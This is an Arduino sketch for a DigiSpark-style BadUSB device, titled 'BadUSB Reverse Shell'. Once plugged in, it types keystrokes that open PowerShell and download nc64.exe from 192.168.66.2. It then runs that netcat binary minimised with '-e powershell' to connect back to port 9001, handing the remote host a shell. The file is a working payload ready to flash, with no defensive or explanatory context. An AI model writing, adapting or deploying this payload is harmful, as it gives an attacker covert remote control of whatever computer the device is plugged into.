#include <DigiKeyboardFi.h>

void setup() {}

void loop() {
	// Description: BadUSB Reverse Shell
	DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(0);
	DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
	DigiKeyboard.delay(1000);
	DigiKeyboardFi.print("powershell");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(1000);
  DigiKeyboardFi.print("Invoke-WebRequest -OutFile nc64.exe -Uri http://192.168.66.2/nc64.exe");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
	DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
	DigiKeyboard.delay(1000);
	DigiKeyboard.print("cmd");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(1000);
	DigiKeyboardFi.print("start /min nc64.exe 192.168.66.2 9001 -e powershell");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboardFi.print("exit");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  exit(0);
}
